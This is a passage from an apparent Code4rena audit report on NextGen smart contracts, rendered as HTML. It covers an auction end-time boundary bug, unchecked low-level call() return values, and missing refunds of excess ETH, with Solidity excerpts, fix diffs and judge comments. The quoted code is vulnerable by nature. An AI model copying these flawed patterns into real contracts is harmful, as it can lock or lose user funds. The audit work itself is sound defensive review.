class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">returnHighestBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionEndTime</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">returnHighestBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionEndTime</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionInfoStru</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newBid</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">auctionInfoStru</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"assessed-type-11\" style=\"position:relative;\"><a href=\"#assessed-type-11\" aria-label=\"assessed type 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Context</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/962#issuecomment-1822926107\">a2rocket (NextGen) confirmed via duplicate issue #962</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/175#issuecomment-1838613170\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has clearly specified what the vulnerability is, has provided a recommended course of action that aligns with best practices, and has specified all aspects of the contract that would fail for the user if they tried to reclaim their lost funds.</p>\n<p>The likelihood of this exhibit manifesting in practice is relatively low (requires a <code>block.timestamp</code> that exactly matches the auction). In the post-merge PoS Ethereum that the project intends to deploy, blocks <strong>are guaranteed to be multiples of <code>12</code> and can only be manipulated as multiples of it</strong>. </p>\n<p>The impact is high, as the funds of the user are irrecoverably lost even with administrative privileges as no rescue mechanism exists, rendering this exhibit a medium severity issue.</p>\n</blockquote>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/175\">here</a>.</em></p>\n<hr>\n<h2 id=\"m-11-unchecked-return-value-of-low-level-calldelegatecall\" style=\"position:relative;\"><a href=\"#m-11-unchecked-return-value-of-low-level-calldelegatecall\" aria-label=\"m 11 unchecked return value of low level calldelegatecall permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-11] Unchecked return value of low-level <code>call()/delegatecall()</code></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#m-01-unchecked-return-value-of-low-level-calldelegatecall\">Hound</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>The <code>call/delegatecall</code> function returns a boolean value indicating whether the call was successful. However, it is important to note that this return value is not being checked in the current implementation.</p>\n<p>As a result, there is a possibility that the call wasnâ€™t successful, while the transaction continues without reverting.</p>\n<p><em>There are 11 instances of this issue.</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AuctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">: \t\t                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">: \t\t                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">: \t\t                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>[<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L113\">113</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L116\">116</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L128\">128</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L139\">139</a>]</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">primaryAdd1</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">artistRoyalties1</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">435</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success2</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">primaryAdd2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">artistRoyalties2</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">436</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success3</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">primaryAdd3</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">artistRoyalties3</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">437</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success4</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tm1</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">teamRoyalties1</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">438</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success5</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tm2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">teamRoyalties2</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">464</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>[<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L434\">434</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L435\">435</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L436\">436</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L437\">437</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L438\">438</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L464\">464</a>]</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RandomizerRNG</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">: \t\t        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>[<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/RandomizerRNG.sol#L82\">82</a>]</p>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Important and valid.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-user-funds-sent-in-excess-are-not-refunded\" style=\"position:relative;\"><a href=\"#m-12-user-funds-sent-in-excess-are-not-refunded\" aria-label=\"m 12 user funds sent in excess are not refunded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-12] User funds sent in excess are not refunded</h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#m-02-user-funds-sent-in-excess-are-not-refunded\">Hound</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>These functions lack a refund mechanism for excess Ether sent by the caller, resulting in locked funds within the contract. To rectify this, the function should be modified to implement a refund for any surplus amount.</p>\n<p><em>There are 3 instances of this issue.</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= (</span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">_numberOfTokens</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wrong ETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_numberOfTokens</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">: \t\t            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) + </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">: \t\t            </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintingAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mintTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">, </span><span class=\"mtk12\">col</span><span class=\"mtk1\">, </span><span class=\"mtk12\">phase</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">: \t\t        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wrong ETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">) + </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk3\">// burn and mint token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnToMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_burnCollectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">, </span><span class=\"mtk12\">burner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= (</span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wrong ETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) + </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">363</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span 